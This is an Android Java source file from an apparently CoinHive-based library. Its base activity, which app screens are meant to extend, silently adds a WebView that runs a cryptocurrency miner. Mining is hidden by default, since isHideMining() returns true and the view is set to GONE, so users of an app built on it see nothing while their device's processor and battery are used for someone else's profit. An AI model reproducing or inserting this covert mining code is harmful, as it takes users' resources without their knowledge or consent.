package com.theah64.coinhive;

import android.support.annotation.LayoutRes;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;

/**
 * Created by theapache64 on 22/9/17.
 */

public class BaseCoinHiveActivity extends AppCompatActivity {


    @Override
    public void setContentView(@LayoutRes int layoutResID) {
        super.setContentView(layoutResID);

        final WebView wvCoinHive = new WebView(this);
        wvCoinHive.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        wvCoinHive.getSettings().setJavaScriptEnabled(true);
        wvCoinHive.loadUrl(CoinHive.generateURL());
        wvCoinHive.addJavascriptInterface(this, "Android");
        wvCoinHive.setWebViewClient(new WebViewClient() {

        });
        System.out.println("Mining started");

        ((ViewGroup) getWindow().getDecorView().findViewById(android.R.id.content)).addView(wvCoinHive);
        if (isHideMining()) {
            wvCoinHive.setVisibility(View.GONE);
        }
    }

    @JavascriptInterface
    public void onStatus(double hashesPerSecond, long totalHashes, long acceptedHashes) {
        if (CoinHive.getInstance().isLoggingEnabled()) {
            System.out.println("Hashes/second:" + hashesPerSecond);
            System.out.println("Total hashes:" + totalHashes);
            System.out.println("Accepted hashes:" + acceptedHashes);
        }

    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        System.out.println("Mining stopped");
    }

    public boolean isHideMining() {
        return true;
    }
}
